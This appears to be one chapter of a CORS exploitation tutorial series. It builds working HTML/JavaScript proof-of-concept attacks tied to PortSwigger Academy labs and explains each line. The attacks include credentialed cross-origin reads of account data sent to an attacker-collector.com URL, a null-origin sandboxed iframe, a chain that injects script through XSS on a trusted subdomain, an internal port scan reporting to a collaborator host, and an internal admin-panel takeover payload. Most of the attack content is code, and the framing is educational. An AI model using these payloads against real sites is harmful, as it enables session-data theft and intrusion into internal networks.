# 03 — Building a Working CORS PoC

This file builds working HTML/JS proof-of-concept exploits for each technique in
`02`, with every line explained. The target endpoint pattern used throughout is
a generic `/accountDetails`-style endpoint: a `GET` request, credentialed, that
returns sensitive JSON (matching the canonical PortSwigger Academy lab pattern
and the most common real-world shape for this bug class — a session/profile API
call).

## 1. The Baseline PoC — Reflected Origin (Technique 1)

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://vulnerable-website.com/accountDetails', true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location = 'https://attacker-collector.com/log?key=' + this.responseText;
    }
</script>
```

### Line-by-Line Breakdown

```js
var req = new XMLHttpRequest();
```
Creates a new `XMLHttpRequest` object — the legacy but still entirely supported
browser API for making HTTP requests from JavaScript. `XMLHttpRequest` (rather
than `fetch`) is used in the canonical PoC because its API makes the
credentialed flag and the response-listener pattern explicit and easy to read;
a `fetch`-based equivalent is shown in section 5 for comparison.

```js
req.onload = reqListener;
```
Registers `reqListener` as the callback to run once the request completes
successfully (the `load` event fires after the full response, including body,
has been received). This is necessary because `XMLHttpRequest` is asynchronous
by default — execution doesn't pause waiting for the response.

```js
req.open('get', 'https://vulnerable-website.com/accountDetails', true);
```
Configures the request: HTTP method `GET`, the full target URL (must be the
real target domain — this is the cross-origin part, since this script is
hosted on the attacker's domain, not the target's), and `true` for the third
argument, which specifies the request is asynchronous (the only mode modern
browsers support for cross-origin `XMLHttpRequest` anyway).

```js
req.withCredentials = true;
```
**This is the single most important line in the entire PoC.** By default,
cross-origin `XMLHttpRequest` calls do **not** send cookies. Setting
`withCredentials = true` tells the browser "attach cookies (and other
credential material, like HTTP auth) to this cross-origin request, and expose
the response to my JavaScript only if the server's CORS headers explicitly
permit credentialed access from my origin." Without this line, the request
would be sent without the victim's session cookie, hit the endpoint
unauthenticated, and either fail outright or return only public data — there
would be nothing worth stealing. This line is what turns "a cross-origin GET
request" into "a cross-origin GET request carrying the victim's live session."

```js
req.send();
```
Actually dispatches the request. Because the conditions for a "simple request"
are met (`GET` method, no custom headers), the browser sends this directly with
no preflight `OPTIONS` round-trip — the attack works with a single HTTP
request/response cycle.

```js
function reqListener() {
    location = 'https://attacker-collector.com/log?key=' + this.responseText;
}
```
The callback. `this.responseText` is the **full body of the response from the
victim's authenticated request** — at this point, if the CORS misconfiguration
exists, the browser has already permitted this script to read it, even though
the script is running on a completely different origin. The line then
navigates the victim's browser (`location = ...`) to an attacker-controlled
logging endpoint, appending the stolen data as a URL query parameter. This is
a deliberately simple exfiltration method — appropriate for lab environments
and for demonstrating impact in a report — and is one of several
exfiltration choices, covered in section 6.

### Why the Attack Succeeds End-to-End

1. Victim, already authenticated to `vulnerable-website.com`, loads the
   attacker's page (via phishing, malicious ad, compromised third-party script,
   or — in lab environments — PortSwigger's exploit server "deliver to victim"
   feature).
2. The script fires a credentialed cross-origin `GET` to the real target.
3. The browser attaches the victim's session cookie because `withCredentials`
   was set and because cookies are always attached to requests to their owning
   domain regardless of who initiated the request (this is the same browser
   behavior CSRF relies on).
4. The server, vulnerable to Technique 1, reflects the attacker's origin into
   `Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`.
5. The browser, seeing both headers correctly satisfied, exposes the response
   body to the attacker's JavaScript.
6. The script exfiltrates the data.

---

## 2. Null Origin PoC (Technique 2)

```html
<iframe
    sandbox="allow-scripts allow-top-navigation allow-forms"
    srcdoc="<script>
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','https://vulnerable-website.com/accountDetails',true);
        req.withCredentials = true;
        req.send();
        function reqListener() {
            location = 'https://attacker-collector.com/log?key=' + encodeURIComponent(this.responseText);
        };
    </script>">
</iframe>
```

### Line-by-Line Breakdown

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="...">
```
The `sandbox` attribute restricts what the iframe's content is allowed to do,
and — critically — **the absence of `allow-same-origin` in that list of
permissions is what forces the iframe's content to run with `Origin: null`**
rather than inheriting the origin of the page that hosts the iframe. This is
the entire mechanism: the attacker deliberately under-permissions their own
iframe to manufacture a `null` origin, then relies on the target trusting that
literal value.

- `allow-scripts` — permits JavaScript to execute inside the iframe (required;
  without it, the embedded `<script>` block simply wouldn't run).
- `allow-top-navigation` — permits the iframe's content to navigate the
  top-level browsing context (the actual browser tab/window), which is what
  lets the final `location = ...` exfiltration line work, since it's
  navigating the whole page, not just the iframe.
- `allow-forms` — not strictly required for this exact PoC (no form
  submission occurs), but is commonly included for compatibility with PoC
  variants that exfiltrate via form auto-submission instead of a `GET`
  navigation; included here for parity with the standard Academy PoC pattern.
- Deliberately **omitted**: `allow-same-origin`. Including it would cause the
  iframe to run with the *attacker's* real origin instead of `null`, defeating
  the entire point of this technique.

```html
srcdoc="..."
```
Instead of pointing the iframe at an external URL with `src`, `srcdoc` embeds
the iframe's full HTML content inline, directly in the attacker's page. This
is purely a packaging convenience — it keeps the whole PoC in one file — and
has no bearing on the `null` origin mechanism itself, which comes entirely from
the `sandbox` configuration.

The inner `<script>` block is otherwise identical to the Technique 1 PoC, with
one addition:

```js
location = 'https://attacker-collector.com/log?key=' + encodeURIComponent(this.responseText);
```
`encodeURIComponent` is used here (and is good practice generally) because
`responseText` for an account-details-style JSON response will contain
characters (`{`, `"`, `:`, spaces) that are unsafe to place directly into a URL
query string without escaping — omitting this can corrupt the exfiltrated data
or break the resulting URL outright.

### Why This Particular Combination Works

The target server, vulnerable to Technique 2, has explicitly allowlisted the
literal string `null`:

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

The sandboxed iframe causes the browser to send `Origin: null` on the request,
which matches that allowlist entry exactly, and the rest of the credential and
exfiltration mechanics are identical to Technique 1.

---

## 3. Subdomain-Trust + XSS Chain PoC (Techniques 4 and 5)

This PoC has two stages: first, navigate the victim to a trusted subdomain that
has an XSS bug; second, have the injected script perform the actual CORS theft
from that now-trusted context.

```html
<script>
document.location = "https://stock.vulnerable-website.com/product?productId=4<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://vulnerable-website.com/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location = 'https://attacker-collector.com/log?key=' + this.responseText;
    };
</script>&storeId=1";
</script>
```

### Line-by-Line Breakdown

```js
document.location = "https://stock.vulnerable-website.com/product?productId=4<script>...</script>&storeId=1";
```
This single line does two jobs at once, which is what makes this PoC compact
but worth slowing down on:

1. **It navigates the victim's browser** to the trusted subdomain
   (`stock.vulnerable-website.com`) — this is the step that puts the victim's
   browser into a browsing context whose origin is one the *target's own CORS
   policy* already trusts.
2. **The `productId` parameter carries an XSS payload** (`4<script>...
   </script>`). If that subdomain reflects the `productId` parameter into the
   page without sanitization (the underlying bug this chain depends on — see
   `02`, Technique 4), the browser parses the injected `<script>` tag as real
   markup and executes the JavaScript inside it as part of the
   `stock.vulnerable-website.com` page.

The embedded script (everything between the injected `<script>` tags) is, once
again, structurally identical to the Technique 1 payload: open a credentialed
`XMLHttpRequest` to the real sensitive endpoint, read the response, exfiltrate
it. The only thing that changed is **where this code is now executing from** —
not the attacker's domain, but the trusted subdomain itself, because the XSS
put it there.

`&storeId=1` is simply a second parameter the vulnerable product page expects
to receive a valid response and render normally — without it, the page may
error out before the injected script has a chance to execute, depending on the
target application's logic. Always check that any required parameters for the
injection point are preserved.

### Why This Particular Combination Works

The CORS policy on `vulnerable-website.com` does something equivalent to:

```js
if (/^https:\/\/[a-z0-9-]+\.vulnerable-website\.com$/.test(origin)) {
    // reflect this origin, allow credentials
}
```

`stock.vulnerable-website.com` matches that pattern and is a real, currently
existing subdomain — so once the attacker's injected script is running *from*
that subdomain, its `Origin` header on the follow-up request to
`/accountDetails` really will be `https://stock.vulnerable-website.com`, and
the server will approve it exactly as designed. The flaw isn't in the header
mechanics at all here — it's that the server's trust boundary ("any subdomain")
is broader than its actual security boundary ("subdomains with no XSS bugs"),
and this PoC is what makes that gap concrete.

For Technique 5 (insecure protocol trust), the only change to this PoC is the
scheme in the navigation URL — `http://stock...` instead of `https://stock...`
— demonstrating that the trust relationship doesn't require HTTPS on the
trusted subdomain, which is the entire point of that technique.

---

## 4. Internal Network Pivot PoC (Technique 6) — Multi-Stage

This is the most involved PoC in the series and is genuinely multi-request,
matching the multi-step nature of the underlying technique.

### Stage 1 — Internal Host Discovery

```html
<script>
    var collaboratorURL = 'https://your-collaborator-id.oastify.com';
    for (var i = 0; i < 256; i++) {
        fetch('http://192.168.0.' + i + ':8080', {mode: 'no-cors'})
            .then(() => {
                fetch(collaboratorURL + '?found=192.168.0.' + i);
            })
            .catch(() => {});
    }
</script>
```

**Breakdown:**
- `mode: 'no-cors'` deliberately opts out of reading the response (which the
  attacker couldn't read anyway without the CORS headers being correct) and is
  used purely to determine, by whether the `fetch` promise resolves rather than
  rejects, whether something is actually listening on that IP:port — a
  client-side version of a port scan.
- The loop sweeps the private range a single octet at a time, fitting the lab's
  known internal subnet (`192.168.0.0/24`); a real engagement would adjust the
  range based on whatever internal addressing scheme is suspected.
- Each successful connection reports back to an out-of-band collaborator-style
  domain, since the attacker's script can't simply read the result or display
  it to themselves directly — they need a side channel that doesn't depend on
  CORS being correctly configured on whatever's running at that IP.

### Stage 2 — Exploit the Discovered Internal Host

Once a live host is found (say `192.168.0.61:8080`), the attacker confirms it's
running the same vulnerable application stack and that it, too, has a
CORS-trusted internal origin policy plus a secondary XSS bug in its login flow
or similar. The payload at this stage fetches that internal host's content,
extracts a CSRF token from it (internal apps still need a valid token to submit
forms), then submits a crafted XSS payload as a parameter value:

```html
<script>
    var collaboratorURL = 'https://your-collaborator-id.oastify.com';
    var url = 'http://192.168.0.61:8080';
    fetch(url)
        .then(response => response.text())
        .then(text => {
            var csrfToken = text.match(/name="csrf" value="([^"]+)"/)[1];
            var xssPayload = '"><iframe src=/admin onload="fetch(\'' + collaboratorURL + '?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML))">';
            location = url + '/login?username=' + encodeURIComponent(xssPayload) + '&password=x&csrf=' + csrfToken;
        });
</script>
```

**Breakdown:**
- The first `fetch(url)` works without `withCredentials` because this stage is
  reading a public, unauthenticated login page on the internal host — no
  session is needed yet, only HTML content to extract the CSRF token from.
- `text.match(...)` is plain JS regex extraction pulling the CSRF token value
  out of the raw HTML response. This step is only possible because the
  internal host's CORS (or lack of any restriction at all, common for
  "internal-only" tools) lets this script read the response body at all — the
  same readability primitive as every prior technique, just applied to an
  internal target instead of the real attacker-facing target.
- `xssPayload` builds a stored/reflected XSS string designed to render as an
  `<iframe>` pointed at the internal admin panel once injected. The `onload`
  handler on that injected iframe then reads the admin panel's rendered DOM
  (`this.contentWindow.document.body.innerHTML`) and reports it out via the
  collaborator channel.
- The final `location = ...` navigates the victim's browser to submit this
  payload as the `username` field of a login form on the internal host —
  abusing a reflected-XSS-via-username-field bug on that internal login page
  to get the payload stored/rendered.

### Stage 3 — Privileged Action

With the admin panel's content (and its CSRF token) now exfiltrated via the
collaborator callback from Stage 2, a final script performs the actual
objective action (in the Academy lab's case, deleting a user) by submitting the
relevant form with the now-known token, from within the same trusted internal
context established in Stage 2.

### Why This Particular Combination Works

No single header misconfiguration is "the" vulnerability here — the chain
works because:

1. The victim's browser is a network vantage point the external attacker could
   never reach directly (Stage 1).
2. The internal application assumes network-location-based access control is
   sufficient and skips real authentication or CORS hardening because "only
   internal users can reach it" (Stages 2–3).
3. Every individual `fetch` in this chain succeeds only because nothing along
   the way enforces a real origin check — the same family of trust failure as
   every earlier technique, just compounded across multiple hops.

---

## 5. `fetch`-Based PoC Variant (For Comparison)

```js
fetch('https://vulnerable-website.com/accountDetails', {credentials: 'include'})
    .then(response => response.text())
    .then(data => {
        location = 'https://attacker-collector.com/log?key=' + encodeURIComponent(data);
    });
```

`credentials: 'include'` is the `fetch` API's direct equivalent of
`XMLHttpRequest.withCredentials = true` — it forces cookies to be attached to
the cross-origin request and is the line that must be present for this PoC
variant to be meaningful for exactly the same reason explained in section 1.
Functionally identical outcome to the `XMLHttpRequest` version; included here
because real-world codebases (and increasingly, lab solutions) use `fetch`
more often than legacy `XMLHttpRequest`, and recognizing both forms during
code review or source analysis matters.

---

## 6. Exfiltration Method Choices

| Method | When to Use | Trade-off |
|---|---|---|
| `location = url + '?key=' + data` | Simple, single-value exfiltration; matches lab conventions | Visible in browser history/address bar; data length limited by URL length limits |
| Out-of-band callback (Burp Collaborator / equivalent) | Multi-stage chains, large data, or when the victim's browser must keep running other steps afterward | Requires an external listener; slightly more setup |
| `fetch(collector, {method: 'POST', body: data})` to attacker server | Larger payloads, avoids URL-encoding concerns, doesn't navigate the victim away from the page | Requires the attacker's own server to accept POST bodies and log them |

In a real engagement or bug bounty report, prefer whichever method makes the
proof-of-concept **clear and reproducible for the triager** — a simple
URL-based exfiltration to a logging endpoint you control, with a screenshot or
recording of the captured data, is usually the most convincing and easiest to
verify.

---

Continue to `04-CORS-Cheatsheet-and-Lab-Mapping.md` for the quick-reference
version of everything in this series, plus the official PortSwigger Academy
lab list in progression order.
